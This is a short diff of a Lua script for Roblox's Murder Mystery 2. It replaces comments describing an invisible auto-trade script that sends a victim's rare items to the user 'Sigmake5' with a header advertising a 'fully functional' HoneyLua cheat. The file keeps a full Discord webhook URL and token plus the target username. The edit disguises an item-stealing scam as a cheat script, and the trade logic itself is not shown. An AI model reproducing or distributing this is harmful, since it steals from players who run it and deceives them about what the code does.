@@ -1,6 +1,4 @@
--- FIXED MM2 FULLY AUTOMATED INVISIBLE TRADE SCRIPT + HONEYLUA LOADER
--- Works with current MM2 version
--- Triggers when Sigmake5 joins, auto trades legendaries/godlies/ancient/unique
+-- FIXED MM2 FULLY FUNCTIONAL HONEYLUA SCRIPT OP
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
